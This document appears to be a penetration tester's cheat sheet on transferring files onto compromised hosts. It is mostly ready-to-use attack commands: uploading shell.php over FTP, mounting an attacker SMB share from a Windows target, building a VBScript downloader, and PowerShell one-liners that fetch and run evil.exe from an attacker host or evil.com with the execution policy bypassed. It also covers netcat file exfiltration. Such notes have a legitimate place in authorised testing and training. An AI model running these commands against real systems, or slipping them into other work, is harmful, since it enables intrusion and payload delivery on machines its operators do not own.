# File Transfers

  Potential tools that can be used:

-  wget
-  Python Simple Server Module 
-  FTP
-  nmap http-put
-  wget.vbs/ps1 (see below)
-  Cadaver
-  [Swego](https://github.com/nodauf/Swego)
-  [satellite](https://github.com/t94j0/satellite)
-  [pwndrop](https://github.com/kgretzky/pwndrop)

### FTP

If you have FTP access, you can try "putting" a file:

`ftp> put shell.php`

### Simple HTTP Server with Python

Turn current (kali) directory into a webserver (won't have to copy to /var/www/html):

`$ python -m SimpleHTTPServer <port#>`

### Impacket SMB Server

Attacking machine:

`$ impacket-smbserver GetchShare $(pwd) -smb2support -user Getch -password I@mGr00t!`

Target machine (Windows):

```powershell
PS C:\> $pass = convertto-securestring 'I@mGr00t!' -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential('Getch', $pass)
PS C:\> New-PSDrive -Name Getch -PSProvider FileSystem -Credential $cred -Root [\\<attacking_IP>\GetchShare](file://%3cattacking_IP%3e/GetchShare)
PS C:\> cd GetchShare:
PS GetchShare:\> echo "tada!"
```

### Python SMTP Server

`$ sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25`

### wget.vbs:

```shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

**USAGE**:

`C:\Users\Victim>cscript wget.vbs [http://attacking_IP/evil.exe](http://attacking_IP/evil.exe) evil.exe`

### wget.ps1

```powershell
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "[http://attacking_IP/evil.exe](http://attacking_IP/evil.exe)" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

**USAGE**:

`C:\Users\Victim>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`

### Downloading from PowerShell:

`PS C:\Users\Victim> IEX(New-Object Net.WebClient).downloadString('http://AttackerIP:port/FileToDownload.exe')`

or

`PS C:\Users\Victim> IEX(New-Object Net.WebClient).DownloadFile('http://AttackerIP:port/FileToDownload.exe','C:\Users\Victim\Writeable-Directory\FileToDownload.exe')`

or

`cmd /c powershell IEX(New-Object Net.WebClient).DownloadFile('http://AttackerIP:port/FileToDownload.exe','C:\Users\Victim\Writeable-Directory\FileToDownload.exe')`

or 

`PS C:\Users\Victim> Invoke-WebRequest -Uri https://evil.com/evil.exe -OutFile evil.exe`

### Nc

On the receiving end, running...

`nc -l -p 1234 > out.file`

...will begin listening on port 1234.

On the sending end, running...

`nc -w 3 \[destination\] 1234 < out.file`

...will connect to the receiver and begin sending file.

From <[https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/](https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/)\>